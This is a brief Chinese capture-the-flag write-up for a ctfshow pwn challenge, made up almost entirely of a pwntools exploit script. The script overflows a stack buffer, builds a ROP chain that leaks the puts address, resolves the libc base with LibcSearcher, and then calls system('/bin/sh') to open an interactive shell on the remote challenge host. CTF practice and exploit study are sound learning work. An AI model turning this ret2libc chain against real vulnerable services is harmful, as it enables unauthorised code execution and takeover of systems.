# 挑战简介
10  
好像哪里不一样了

远程libc环境 Ubuntu 18

# 思路
用pwn46的题解可以通解，只需要注意改一下ret，rdi_ret以及ctfshow的泄露地址即可

```
from pwn import *
from LibcSearcher import *
context.log_level = "debug"

p= remote("pwn.challenge.ctf.show",28129)
elf = ELF('d:/edge 下载/源码 (1)/pwn')

offset = 0x20 + 0x8

rdi_addr = 0x4007e3

ret_addr = 0x4004fe

vuln = elf.symbols['ctfshow']

puts_plt = elf.plt['puts']

puts_got = elf.got['puts']

payload = b'a'*offset + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(vuln)
p.sendline(payload)

puts_real = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
# 64位的libc共享库字节常是"\x7f"  ,32位的是"\xf7"
#然后将这个8字节的序列转换为一个64位无符号整数。

libc = LibcSearcher('puts',puts_real)

libc_base = puts_real - libc.dump('puts')

bin_sh = libc_base + libc.dump('str_bin_sh')

sys_addr = libc_base + libc.dump('system')

payload = b'a'*offset + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)

print(payload)

p.sendline(payload)

p.interactive()

```
